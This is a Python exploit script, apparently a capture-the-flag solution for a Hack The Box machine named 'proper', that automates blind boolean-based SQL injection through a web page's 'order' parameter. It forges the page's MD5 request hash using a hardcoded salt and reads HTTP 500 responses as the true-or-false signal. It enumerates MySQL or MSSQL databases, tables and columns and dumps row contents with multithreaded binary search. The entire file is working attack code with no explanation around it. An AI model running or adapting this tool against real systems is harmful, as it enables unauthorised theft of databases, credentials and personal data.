import requests
import sys
import concurrent.futures
import hashlib
from bs4 import BeautifulSoup
from math import ceil

def inject(payload): ## function that returns True in the case of a success condition
    url = "http://proper.htb:80/products-ajax.php"
    inj = fr"(SELECT (CASE WHEN ({payload}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))-- -"
    h = hashlib.md5(f"hie0shah6ooNoim{inj}".encode()).hexdigest()
    r = requests.get(url, params={"order": inj, "h": h})
    if r.status_code == 500:
        return False
    return True
    
    

def get_length(length_query):
    #Check if field exists
    is_null = f"SELECT ISNULL(({length_query}))"
    if inject(is_null):
        return "NULL"

    #Get min and max lengths    
    max_length = 10
    min_length = 1
    while True:
        payload = f"SELECT ({length_query}) < {max_length + 1}"
        if inject(payload):
            break
        min_length = max_length + 1
        max_length *= 10
        if max_length >= 100000:
            return "NULL"

    # Binary Search to find the length
    while True:
        current = min_length + ceil((max_length - min_length) / 2)
        payload = f"SELECT ({length_query}) < {current}"
        if inject(payload):
            max_length = current - 1
        else:
            min_length = current

        if max_length == min_length:
            return max_length


def extract_data(data, dbms=None, database=None, table=None, column=None, order=None, thread=0):
    if data == "version":
        query = "SELECT @@VERSION"
    elif data == "dbs":
        if dbms == "MSSQL":
            query = f"SELECT db_name({thread})"
        elif dbms == "MYSQL":
            query = f"SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT {thread},1"
            length_query = f"SELECT length(schema_name) FROM information_schema.schemata ORDER BY schema_name LIMIT {thread},1"
        else:
            print("Dbms must be MYSQL or MSSQL")
            sys.exit()
    elif data == "tables":
        if dbms == "MSSQL":
            query = f"SELECT name FROM {database}..sysobjects WHERE xtype='U' ORDER BY name OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
        if dbms == "MYSQL":
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' ORDER BY table_name LIMIT {thread},1"
            length_query = f"SELECT length(table_name) FROM information_schema.tables WHERE table_schema='{database}' ORDER BY table_name LIMIT {thread},1"
    elif data == "columns":
        if dbms == "MSSQL":
            query = f"SELECT column_name FROM {database}.information_schema.COLUMNS WHERE table_name='{table}' ORDER BY 1 ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
        if dbms == "MYSQL":
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' ORDER BY column_name LIMIT {thread},1"
            length_query = f"SELECT length(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' ORDER BY column_name LIMIT {thread},1"
    elif data == "dump":
        if dbms == "MSSQL":
            query = f"SELECT CAST({column} AS VARCHAR(4000)) FROM {database}..{table} ORDER BY {order} ASC OFFSET {thread} ROW FETCH NEXT 1 ROW ONLY"
        if dbms == "MYSQL":
            query = f"SELECT {column} FROM {database}.{table} ORDER BY {order} LIMIT {thread},1"
            length_query = f"SELECT length({column}) FROM {database}.{table} ORDER BY {order} LIMIT {thread},1"

    if data != "version":
        length = get_length(length_query)
        if length == "NULL":
            if data == "dump":
                return [thread+1, "NULL"]
            else:
                return "NULL"

    else:
        length = 50
    skeleton = "ASCII(SUBSTRING(({}),{},1)) <={}"
    current_char = 1
    output = ""
    done = False
    while True:
        if len(output) == length:
            break
        maximum = 127
        minimum = 32
        while True:
            current = minimum + ((maximum - minimum) // 2)
            payload = skeleton.format(query, current_char, current)
            if inject(payload):
                maximum = current
                if maximum == minimum:
                    if maximum < 32 or minimum > 127:
                        done = True
                        break
                    output += chr(maximum)
                    current_char += 1
                    break
            else:
                if maximum == minimum:
                    done = True
                    break
                minimum = current + 1
        if done:
            break
        if data == "version":
            print("\r" + output, end="", flush=True)
            if output.endswith("  "):
                break
    if data == "version":
        print("\n")
    if data == "dump":
        return [thread+1, output]
    return output
    
        
def process_input(database=None, table=None, column=None):

    if len(sys.argv) == 1:
        extract_data("version")
        return
        
    if len(sys.argv) == 2:
        data = "dbs"
        dbms = sys.argv[1].upper()
        
    if len(sys.argv) == 3:
        data = "tables"
        dbms = sys.argv[1].upper()
        database = sys.argv[2]
        
    if len(sys.argv) == 4:
        data = "columns"
        dbms = sys.argv[1].upper()
        database = sys.argv[2]
        table = sys.argv[3]
        
    if len(sys.argv) == 5:
        data = "dump"
        dbms = sys.argv[1].upper()
        database = sys.argv[2]
        table = sys.argv[3]
        columns = sys.argv[4].split(",")
        dump = {}
        
    loc = 0
    done = False
    while not done:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            threads = list(range(loc,loc+5))
            if data == "dump":
                all_output = [[executor.submit(extract_data, data, database=database, dbms=dbms, table=table, column=i, order=columns[0], thread=t) for t in threads] for i in columns]
            else:
                output = [executor.submit(extract_data, data, database=database, dbms=dbms, table=table, column=column, thread=t) for t in threads]
                
            if data == "dump":
                for x in all_output:
                    for i in concurrent.futures.as_completed(x):
                        if i.result()[1] != "NULL":
                            if i.result()[0] in dump:
                                dump[i.result()[0]].append(i.result()[1])
                            else:
                                dump[i.result()[0]] = [i.result()[1]]
                        else:
                            done = True
                for i in threads:
                    if i+1 in dump:
                        print("    ".join(dump[i+1]))    
                
            else:
                for i in concurrent.futures.as_completed(output):
                    if i.result() != "NULL":                        
                        print(i.result())
                    else:
                        done = True
        loc += 5

def main():
    if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
        print("Usage python3 blindmysql.py <dbms> <database> <table> <comma separated columns> (Use fewer arguments to extract metadata)")
        return
    process_input()
    
if __name__ == "__main__":
    main()
